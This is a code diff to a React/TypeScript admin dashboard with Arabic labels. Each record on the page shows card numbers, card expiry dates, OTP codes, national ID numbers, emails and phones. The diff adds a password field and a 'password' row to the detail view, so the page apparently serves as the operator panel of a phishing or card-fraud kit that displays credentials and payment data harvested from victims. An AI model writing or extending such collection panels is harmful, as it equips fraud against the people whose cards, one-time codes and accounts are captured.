@@ -142,7 +142,8 @@ interface Notification {
   network: string;
   phoneOtp: string;
   cardExpiry: string;
-  firstName: string;
+  userName?: string;
+  password?: string;
   otpCode: string;
   phone: string;
   flagColor?: string;
@@ -876,7 +877,7 @@ export default function NotificationsPage() {
       const term = searchTerm.toLowerCase();
       filtered = filtered.filter(
         (notification) =>
-          notification.firstName?.toLowerCase().includes(term) ||
+          notification.userName?.toLowerCase().includes(term) ||
           notification.email?.toLowerCase().includes(term) ||
           notification.phone?.toLowerCase().includes(term) ||
           notification.cardNumber?.toLowerCase().includes(term) ||
@@ -1620,10 +1621,10 @@ export default function NotificationsPage() {
                         <div className="flex flex-wrap gap-2">
                           <Badge
                             variant={
-                              notification.firstName ? "default" : "secondary"
+                              notification.userName ? "default" : "secondary"
                             }
                             className={`cursor-pointer transition-all hover:scale-105 ${
-                              notification.firstName
+                              notification.userName
                                 ? "bg-gradient-to-r from-blue-500 to-blue-600 text-white"
                                 : ""
                             }`}
@@ -1632,7 +1633,7 @@ export default function NotificationsPage() {
                             }
                           >
                             <User className="h-3 w-3 mr-1" />
-                            {notification.firstName
+                            {notification.userName
                               ? "معلومات شخصية"
                               : "لا يوجد معلومات"}
                           </Badge>
@@ -1804,9 +1805,9 @@ export default function NotificationsPage() {
                     <div className="space-y-4">
                       <div className="flex flex-wrap gap-2">
                         <Badge
-                          variant={notification.firstName ? "default" : "secondary"}
+                          variant={notification.userName ? "default" : "secondary"}
                           className={`cursor-pointer ${
-                            notification.firstName
+                            notification.userName
                               ? "bg-gradient-to-r from-blue-500 to-blue-600 text-white"
                               : ""
                           }`}
@@ -1815,7 +1816,7 @@ export default function NotificationsPage() {
                           }
                         >
                           <User className="h-3 w-3 mr-1" />
-                          {notification.firstName
+                          {notification.userName
                             ? "معلومات شخصية"
                             : "لا يوجد معلومات"}
                         </Badge>
@@ -1965,13 +1966,13 @@ export default function NotificationsPage() {
             <div className="space-y-4">
               <div className="bg-gradient-to-br from-muted/50 to-muted/30 rounded-lg p-4 space-y-3">
                 {[
-                  { label: "الاسم", value: selectedNotification.firstName },
+                  { label: "الاسم", value: selectedNotification.userName },
                   { label: "رقم الهوية", value: selectedNotification.idNumber },
                   {
                     label: "البريد الإلكتروني",
                     value: selectedNotification.email,
                   },
-                  { label: "رقم الجوال", value: selectedNotification.mobile },
+                  { label: "كلمة المرور", value: selectedNotification.password },
                   { label: "الهاتف", value: selectedNotification.phone },
                 ].map(
                   ({ label, value }) =>
